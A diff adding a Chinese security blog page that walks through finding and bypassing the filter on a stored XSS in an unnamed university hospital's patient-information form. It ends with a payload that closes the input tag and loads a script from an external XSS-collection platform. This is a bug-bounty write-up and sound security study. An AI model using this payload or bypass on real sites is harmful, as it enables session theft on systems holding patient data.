@@ -1,0 +1,568 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="reader-l">
+  <meta name="keywords" content="reader-l&#39;s blog">
+  <title>某大学的附属医院存储XSS漏洞-Bypass - reader-l&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"reader-l.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="reader-l's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>reader-l's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/List/">
+                <i class="iconfont icon-link-fill"></i>
+                List
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="某大学的附属医院存储XSS漏洞-Bypass">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-03-05 19:11" pubdate>
+        2021年3月5日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      643 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      7
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">某大学的附属医院存储XSS漏洞-Bypass</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2021年3月5日 晚上
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​    在对某个大学进行漏洞挖掘的时候，挖着挖着就挖到它的附属医院了。在可以进行注册的普通用户的后台，初步发现可以写入html标签代码到页面中，即存在存储型XSS漏洞的可能。</p>
+<h1 id="2-漏洞初探"><a href="#2-漏洞初探" class="headerlink" title="2.漏洞初探"></a>2.漏洞初探</h1><p>疑似漏洞点是在个人信息中的就诊人信息处，点击修改操作。</p>
+<p><img src="/2021/03/05/%E6%9F%90%E5%A4%A7%E5%AD%A6%E7%9A%84%E9%99%84%E5%B1%9E%E5%8C%BB%E9%99%A2%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E-Bypass/1.png" srcset="/img/loading.gif"></p>
+<p>因为存在前台的检验，因此先填写正常的信息提交，然后用Burp进行抓包修改。</p>
+<p><img src="/2021/03/05/%E6%9F%90%E5%A4%A7%E5%AD%A6%E7%9A%84%E9%99%84%E5%B1%9E%E5%8C%BB%E9%99%A2%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E-Bypass/2.png" srcset="/img/loading.gif"></p>
+<p>尝试写入一些html标签，查看目标页面是否被正常写入并解析。</p>
+<p>可以发现当我写入<code>&lt;svg&gt;</code>的时候，标签是正常的，没有被实体化编码。</p>
+<p><img src="/2021/03/05/%E6%9F%90%E5%A4%A7%E5%AD%A6%E7%9A%84%E9%99%84%E5%B1%9E%E5%8C%BB%E9%99%A2%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E-Bypass/3.png" srcset="/img/loading.gif"></p>
+<p>当我尝试写入<code>&lt;svg onload=</code>的时候，发现目标一直处于未响应状态。接连尝试写入<code>onxxxx=</code>这类型的事件都会如此。</p>
+<p><img src="/2021/03/05/%E6%9F%90%E5%A4%A7%E5%AD%A6%E7%9A%84%E9%99%84%E5%B1%9E%E5%8C%BB%E9%99%A2%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E-Bypass/4.png" srcset="/img/loading.gif"></p>
+<p>写入<code>&lt;script&gt;</code>标签时，虽然返回包状态码是200，但是并没有被写入。</p>
+<p><img src="/2021/03/05/%E6%9F%90%E5%A4%A7%E5%AD%A6%E7%9A%84%E9%99%84%E5%B1%9E%E5%8C%BB%E9%99%A2%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E-Bypass/5.png" srcset="/img/loading.gif"></p>
+<p>我以为是替换为空，所以尝试双写<code>&lt;scrscriptipt&gt;</code>、<code>&lt;scr&lt;script&gt;ipt&gt;</code>皆以失败告终。</p>
+<p><img src="/2021/03/05/%E6%9F%90%E5%A4%A7%E5%AD%A6%E7%9A%84%E9%99%84%E5%B1%9E%E5%8C%BB%E9%99%A2%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E-Bypass/6.png" srcset="/img/loading.gif"></p>
+<h1 id="3-小聪明"><a href="#3-小聪明" class="headerlink" title="3.小聪明"></a>3.小聪明</h1><p>有师傅会问，为啥不进行fuzz，然后再尝试利用呢？我也想啊，但是某漏洞平台收录存储型XSS漏洞的标准是：</p>
+<p>1.不收Self-Xss，反射型XSS。</p>
+<p>2.不收需要用户交互的存储型XSS，就是说即使成功利用了onmouseover这个事件，也是不行的（那还得要受害者将鼠标移过去）。</p>
+<p>3.收录目标一访问就自动触发的存储型XSS。</p>
+<p>而且我比较笨，学到比较少，我的有限知识不允许。</p>
+<p>回到正题：</p>
+<p>在进行各种姿势的尝试时，我发现只传入<code>&lt;script</code>是不会被过滤拦截的，我顿时明白目标可能是采取了正则的方式来进行匹配过滤，如果用户输入存在<code>&lt;scriptasdasd&gt;</code>这种，就是以<code>&lt;script</code>开头，<code>任意字符&gt;</code>结尾都会将其整体移除。</p>
+<p><img src="/2021/03/05/%E6%9F%90%E5%A4%A7%E5%AD%A6%E7%9A%84%E9%99%84%E5%B1%9E%E5%8C%BB%E9%99%A2%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E-Bypass/7.png" srcset="/img/loading.gif"></p>
+<p>但是<code>&lt;script&gt;</code>标签要想进行解析，必须需要闭合。这时候就是脑袋突然灵动，我写入的代码不正是一个<code>&lt;input&gt;</code>标签语句吗？我只要闭合前面的标签，将后面的标签拿来闭合我们传入的<code>&lt;script</code>不就可以了。</p>
+<p><img src="/2021/03/05/%E6%9F%90%E5%A4%A7%E5%AD%A6%E7%9A%84%E9%99%84%E5%B1%9E%E5%8C%BB%E9%99%A2%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E-Bypass/9.png" srcset="/img/loading.gif"></p>
+<p>构造payload：<code>&quot;;/&gt;&lt;script/src=&quot;http://xss平台/reader-l</code>，<code>&lt;script/src</code>是因为过滤了空格，所以用该方法绕过。</p>
+<p><img src="/2021/03/05/%E6%9F%90%E5%A4%A7%E5%AD%A6%E7%9A%84%E9%99%84%E5%B1%9E%E5%8C%BB%E9%99%A2%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E-Bypass/10.png" srcset="/img/loading.gif"></p>
+<p>成功自动发起请求。</p>
+<p><img src="/2021/03/05/%E6%9F%90%E5%A4%A7%E5%AD%A6%E7%9A%84%E9%99%84%E5%B1%9E%E5%8C%BB%E9%99%A2%E5%AD%98%E5%82%A8XSS%E6%BC%8F%E6%B4%9E-Bypass/11.png" srcset="/img/loading.gif"></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/03/06/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B8%89-Windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">内网安全学习三-Windows系统提权</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/02/21/%E4%BB%8E%E6%9F%90%E9%AB%98%E6%A0%A1%E7%9A%84%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E6%89%BE%E5%88%B0%E7%9A%84webshell/">
+                        <span class="hidden-mobile">从某高校的备份文件找到的webshell</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('vcomments', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "r1aoO2CU8pztHBXDkQYFikuI-gzGzoHsz",
+          app_key: "dJhm8HsnHbHaA1BVeojBc6MI",
+          placeholder: "Just go go",
+          path: window.location.pathname,
+          avatar: "mm",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the
+    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
+  </noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
